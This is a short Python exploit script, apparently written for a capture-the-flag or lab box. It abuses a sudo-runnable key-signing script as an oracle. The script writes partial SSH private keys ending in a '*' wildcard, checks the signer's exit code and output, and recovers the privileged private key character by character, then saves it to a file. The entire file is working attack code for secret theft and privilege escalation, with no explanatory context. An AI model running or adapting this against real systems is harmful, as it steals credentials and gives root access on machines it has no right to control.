import string
import subprocess
from sys import exit as sys_exit
from os import system as os_system

SSH_key_header: str = "-----BEGIN OPENSSH PRIVATE KEY-----"
SSH_key_footer: str = "-----END OPENSSH PRIVATE KEY-----"

charmap: list[str] = list('-' + string.ascii_letters + string.digits + '+/=')
name_fake_key: str = 'generated_key.key'
current_key: str = ''
n_lines: int = 0
while True:
    for char in charmap:
        content_key = f"{SSH_key_header}\n{current_key}{char}*"
        with open(name_fake_key, 'w') as f:
            f.write(content_key)
        os_system('clear')
        print(content_key)
        execute_command = subprocess.run(f"sudo /opt/sign_key.sh {name_fake_key} keypair.pub root root_user 1", shell=True, stdout=subprocess.PIPE, text=True)
        if (execute_command.returncode == 1) and ('API' in execute_command.stdout):
            current_key += char
            if (len(current_key) > 1) and ((len(current_key) - n_lines)%70 == 0):
                current_key += "\n"
                n_lines += 1
            break
    else:
        break


final_key = f"{SSH_key_header}\n{current_key}\n{SSH_key_footer}"

with open('obtained_key.key', 'w') as f:
    f.write(final_key)
print(f"[+] Key extracted:\n{final_key}")
